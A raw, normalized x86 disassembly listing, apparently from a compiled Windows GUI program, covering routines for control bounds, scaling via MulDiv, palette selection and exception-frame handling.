mov eax r-xdata
call sub_408c7c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f40
sub_44c484
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44c4eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_459c34
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_44d634
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov edx [ eax + 0x64 ]
pop eax
call sub_4042f8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c4f2
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov al 0x1
sub_44c4f8
push ebx
mov ebx eax
mov eax ebx
call sub_459c5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c52c
push ebx
mov ebx eax
mov eax ebx
call sub_459cac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4042f8
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c564
push ebx
mov ebx eax
mov eax ebx
call sub_459ce8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c598
push ebx
mov ebx eax
mov eax ebx
call sub_4212b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44c5c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44d664
sub_44c5e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_44c600
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f40
sub_44c624
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44d554
sub_44c644
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_44c670
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4042f8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_44c6d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44cfb0
sub_44c6f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44cf9c
sub_44c714
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_44c734
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4209c8
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44d6e4
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c254
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_44e5a8
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_44c80c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403528
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46ca3c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403510
push edi
xor ecx ecx
mov edx 0xb039
call sub_44e7e8
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_44cfd4
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403370
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403174
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403174
mov eax [ edi + 0x68 ]
call sub_403174
mov eax [ edi + 0x64 ]
call sub_4087ec
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420a14
test bl bl
jle r-xdata
sub_44c8d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_44c900
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403370
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44c988
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_44cc88
sub_44c9a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403174
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44f604
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403370
mov edx ebx
mov eax edi
call sub_420a98
mov eax ebx
mov si 0xffd9
call sub_403370
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_44ca70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420e28
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44e7e8
sub_44cb04
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420ce4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44d5ec
jmp r-xdata
xor edx edx
mov eax esi
call sub_44c9a8
sub_44cb48
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403370
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_44c988
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403370
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_44cbf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44ed78
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44da7c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44cc88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44e7e8
mov eax ebx
mov si 0xffd0
call sub_403370
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403370
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_44cc88
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_44cda4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_44cdc8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_44cdf0
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_44ce14
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_44ce38
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_44cf33
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403370
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cf3a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418444
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403370
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403370
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41814c
sub_44cf44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44da7c
mov edx edi
mov eax ebx
call sub_44cff4
mov edx edi
mov eax ebx
call sub_44e88c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44cfb0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f40
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_44cff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44d050
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d07c
mov edx eax
mov ecx esp
mov eax esi
call sub_416c28
mov edx esp
mov eax ebx
call sub_44d4c0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44d094
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d038
mov ecx esp
mov edx esi
call sub_416c28
mov edx esp
mov eax ebx
call sub_44d4c0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44d0bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d13d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d144
lea eax [ ebp - 0xc ]
call sub_403eec
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
sub_44d14c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44d178
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44d1a4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_468f90
sub_44d1d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44e7e8
sub_44d250
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_423cc8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_423ce4
sub_44d41c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44d4b2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420f20
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44d634
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4042f8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d4b9
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44d664
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_44d4c0
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_44d508
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
test esi esi
je r-xdata
mov edx ebx
call sub_450a94
mov edx ebx
mov eax esi
call sub_4509c0
mov eax ebx
call sub_44cc88
sub_44d554
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403370
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44e7e8
mov eax edi
mov si 0xffd0
call sub_403370
sub_44d5ec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_461494
mov edx ebx
mov eax esi
call sub_420a98
sub_44d610
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44e7e8
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44e7e8
